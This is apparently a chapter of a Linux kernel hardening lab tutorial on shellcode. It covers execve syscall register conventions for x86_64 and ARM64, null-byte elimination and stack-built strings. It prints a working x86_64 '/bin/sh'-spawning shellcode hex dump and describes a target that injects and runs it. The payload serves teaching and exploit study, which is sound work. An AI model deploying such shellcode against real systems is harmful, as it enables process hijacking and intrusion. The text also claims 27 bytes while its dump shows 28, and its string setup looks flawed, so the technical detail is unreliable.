# 04. Shellcode Architecture and Opcode Engineering (Shellcode Engineering)

Analyzing the design, constraints, and assembly craft of **Shellcode**—raw machine bytecode injected by attackers to spawn an interactive command shell upon hijacking process control flow.

---

## 1. Learning Objectives & Overview

- Understand shellcode as standalone machine opcodes executed directly by the CPU without a compiler, linker, or runtime.
- Learn register layout conventions for invoking the Linux 64-bit `execve("/bin/sh", NULL, NULL)` system call.
- Master the mechanics of **Null-Byte (`\x00`) elimination** to bypass string-copying termination.
- Implement **Position-Independent Code (PIC)** using stack-based string construction.
- Compare x86_64 (27-byte null-free) and ARM64 (36-byte) shellcode architectures.

---

## 2. Interactive Shellcode Opcode Inspector

Explore the raw byte streams and register alterations across x86_64 and ARM64 architectures below:

<div style="width: 100%; margin: 24px 0; border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; overflow: hidden;">
  <iframe src="../../assets/diagrams/principles/04-shellcode.html" style="width: 100%; border: none; display: block; overflow: hidden;" scrolling="no" onload="try { const c = this.contentWindow.document.getElementById('diagramCanvas'); if(c) this.style.height = Math.ceil(c.getBoundingClientRect().height) + 'px'; } catch(e){}"></iframe>
</div>

---

## 3. Linux `execve` System Call Specification

The objective of an initial exploit payload is invoking the operating system's `sys_execve` syscall to replace the current process image with `/bin/sh`:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

- **x86_64 Syscall Convention**:
  - `RAX` = 59 (`0x3b`, `__NR_execve`)
  - `RDI` = Pointer to `"/bin/sh"` string (1st argument: path)
  - `RSI` = Pointer to `["/bin/sh", NULL]` array (2nd argument: argv)
  - `RDX` = `NULL (0)` (3rd argument: envp)
  - `syscall` instruction
- **ARM64 Syscall Convention**:
  - `X8` = 221 (`0xdd`, `__NR_execve`)
  - `X0` = Pointer to `"/bin/sh"`
  - `X1` = `NULL (0)`
  - `X2` = `NULL (0)`
  - `svc #0` instruction

---

## 4. Three Fundamental Shellcode Engineering Constraints

### 4.1 Null-Byte (`\x00`) Elimination

String functions (`strcpy`, `gets`, `sprintf`) abort upon encountering `\x00`:

- **Flawed Code**: `mov $0, %eax` ➔ Opcode: `\xb8\x00\x00\x00\x00` (Generates 4 null bytes).
- **Null-Free Solution**: `xor %eax, %eax` ➔ Opcode: `\x31\xc0` (Clears EAX with 0 null bytes).
- **Syscall Number**: Loading `59` via `mov $0x3b, %al` instead of 64-bit RAX ➔ `\xb0\x3b`.

### 4.2 Position Independence (PIC) via Stack Pushes

Because target memory addresses fluctuate under ASLR and diverse environments, shellcode dynamically constructs strings on the stack:

```nasm
xor    %eax, %eax
movabs $0x68732f2f6e69622f, %rbx ; "/bin//sh" reversed in little-endian
push   %rbx                      ; Place string on stack
mov    %rsp, %rdi                ; Point RDI to current stack string
```

### 4.3 Little-Endian String Alignment

x86_64 and ARM64 processors store data in little-endian order. The 8-byte string `"/bin//sh"` is represented in reverse:

```
String:  '/'   'b'   'i'   'n'   '/'   '/'   's'   'h'
ASCII:  0x2f  0x62  0x69  0x6e  0x2f  0x2f  0x73  0x68
64-bit: 0x68732f2f6e69622f
```

---

## 5. Lab Source Code & Opcode Inspection

- **Lab Source Code**: [`shellcode_tester.c`](../../assets/labs/principles/04-shellcode/shellcode_tester.c) (Local Asset) | [GitHub Source Code Repository :octicons-mark-github-16:](https://github.com/auking45/linux-kernel-hardening-lab/blob/main/labs/principles/04-shellcode/shellcode_tester.c)
- **Dedicated Makefile**: [`Makefile`](../../assets/labs/principles/04-shellcode/Makefile)

### 5.1 Inspecting Bytecodes

```bash
cd labs/principles/04-shellcode
make run
```

```
=== Linux Kernel Hardening Lab - Shellcode Engineering ===

============================================================
 Shellcode Inspection [x86_64] (Total Length: 27 bytes)
============================================================
[Hex Dump]
  \x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
  \x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6
  \xb0\x3b\x0f\x05

[Analysis]
  [+] Null-Byte Check: PASSED (0 null bytes detected).
      Safe for injection into strcpy(), gets(), sprintf().
============================================================
```

### 5.2 Optional Shell Execution

Run `make run-exec` to allocate executable memory, inject the shellcode, and launch `/bin/sh`.

---

## 6. Summary & Next Chapter

- Shellcode provides concise, null-free, position-independent machine code.
- In the final chapter of this track, we deliver this payload via a stack vulnerability: **[05. Classic Stack Buffer Overflow and Control Flow Hijacking](05-stack-bof-rip.md)**.
